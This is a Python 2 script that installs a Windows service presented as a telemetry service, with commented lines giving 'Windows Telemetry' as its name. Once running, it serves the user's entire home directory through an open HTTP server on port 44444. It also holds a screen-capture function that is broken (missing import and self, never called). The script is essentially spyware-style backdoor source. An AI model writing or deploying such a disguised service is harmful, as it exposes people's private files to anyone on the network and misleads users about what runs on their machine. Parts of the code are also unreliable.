import os
import sys
import win32serviceutil
import win32service
import win32event
import win32api
import win32ui
import win32con
import win32api
import servicemanager
import socket


#python FakeService3.py install
class AppServerSvc (win32serviceutil.ServiceFramework):
    #FakeService3.py  binpath= "C:\Python27\Python.exe" --startup=auto install
    #_svc_name_ = "Windows Telemetry"
    #_svc_display_name_ = "Windows Telemetry"
    _svc_name_ = "Testing Service"
    _svc_display_name_ = "Testing Service"
    _svc_description_ = "Service for active telemetry and modfications to the telemetry."

    def __init__(self,args):
        win32serviceutil.ServiceFramework.__init__(self,args)
        self.hWaitStop = win32event.CreateEvent(None,0,0,None)
        

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_,''))
        try:
            self.main()
        except Exception as ex:
            open("C:\\faillog.txt","a+").write(ex)


    def snapshot(location):
      
        hwin = win32gui.GetDesktopWindow()
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        hwindc = win32gui.GetWindowDC(hwin)
        srcdc = win32ui.CreateDCFromHandle(hwindc)
        memdc = srcdc.CreateCompatibleDC()
        bmp = win32ui.CreateBitmap()
        bmp.CreateCompatibleBitmap(srcdc, width, height)
        memdc.SelectObject(bmp)
        memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
        bmp.SaveBitmapFile(memdc, location)

 
    def main(self):
        import SimpleHTTPServer
        import SocketServer

        from os.path import expanduser
        home = expanduser("~")
        home = os.getenv("HOMEPATH")
        #print(home)
        os.chdir(home)
        PORT = 44444

        Handler = SimpleHTTPServer.SimpleHTTPRequestHandler

        httpd = SocketServer.TCPServer(("", PORT), Handler)
        
        httpd.serve_forever()
        
        pass
                    

        pass

if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(AppServerSvc)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(AppServerSvc)